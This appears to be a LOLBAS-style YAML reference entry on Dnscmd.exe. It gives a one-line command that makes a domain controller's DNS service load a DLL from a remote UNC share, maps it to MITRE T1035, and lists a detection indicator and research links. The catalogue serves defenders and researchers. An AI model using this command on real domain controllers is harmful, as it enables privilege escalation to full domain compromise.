---
name: Dnscmd.exe
description: A command-line interface for managing DNS servers
functions:
  execute:
    - description: Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.
      code: dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll
      mitreid: T1035
      mitrelink: https://attack.mitre.org/wiki/Technique/T1035
      operatingsystem: Windows server
      privileges: DNS admin
      usecase: Remotly inject dll to dns server
resources:
    - resource: https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
    - resource: https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html
    - resource: https://github.com/dim0x69/dns-exe-persistance/tree/master/dns-plugindll-vcpp
    - resource: https://twitter.com/Hexacorn/status/994000792628719618
    - resource: http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html
fullpath:
    - path: C:\Windows\System32\Dnscmd.exe
    - path: C:\Windows\SysWOW64\Dnscmd.exe
detection:
  - IOC: Dnscmd.exe loading dll from UNC path
acknowledgement:
  - Person: Shay Ber
    Handle: ''
  - Person: Dimitrios Slamaris
    Handle: '@dim0x69'
  - Person: Nikhil SamratAshok
    Handle: '@nikhil_mitt'
---
